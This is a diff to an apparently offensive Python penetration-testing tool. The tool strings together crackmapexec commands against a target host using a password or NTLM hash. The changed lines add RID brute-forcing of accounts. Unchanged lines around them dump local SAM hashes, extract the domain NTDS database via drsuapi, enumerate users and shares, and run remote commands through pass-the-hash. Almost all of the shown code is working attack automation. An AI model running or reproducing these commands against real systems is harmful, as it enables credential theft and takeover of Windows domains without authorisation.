@@ -2795,7 +2795,7 @@ while True:
       if checkParam != 1:
          checkParam = test_DOM()               
       if checkParam != 1:      
-         if PAS[:2] != "''":
+         if NTM[:5] == "EMPTY": # Then use IP
             checkParam = test_PRT("5985")                                    
             if checkParam != 1:
                print("[+] Finding exploitable machines on the same subnet...\n")
@@ -2814,6 +2814,8 @@ while True:
                remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --sam")               
                print("\n[+] Enumerating NTDS...\n")
                remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --ntds drsuapi")
+               print("\n[+] Performing rid brute...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --rid-brute")               
          else:
             print("[i] Using HASH value as password credential...")
             checkParam = test_PRT("5985")
@@ -2823,7 +2825,7 @@ while True:
             checkParam = test_PRT("445")
             if checkParam != 1:
                print("\n[+] Checking priviliges...\n")
-               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X whoami /priv")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' -X whoami")
                print("\n[+] Enumerating users...\n")
                remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --users")               
                print("\n[+] Enumerating shares...\n")
@@ -2834,7 +2836,10 @@ while True:
                remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --sam")               
                print("\n[+] Enumerating NTDS...\n")
                remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --local-auth --ntds drsuapi")
-      prompt()	# EOF Error here for some reason?
+               print("\n[+] Performing rid brute...\n")
+               remoteCOM("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") + "' --rid-brute")
+      print("KNOWN CODING ERROR _ CRACKMAPEXEC EOF TERMINATION")         
+      prompt()
                
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
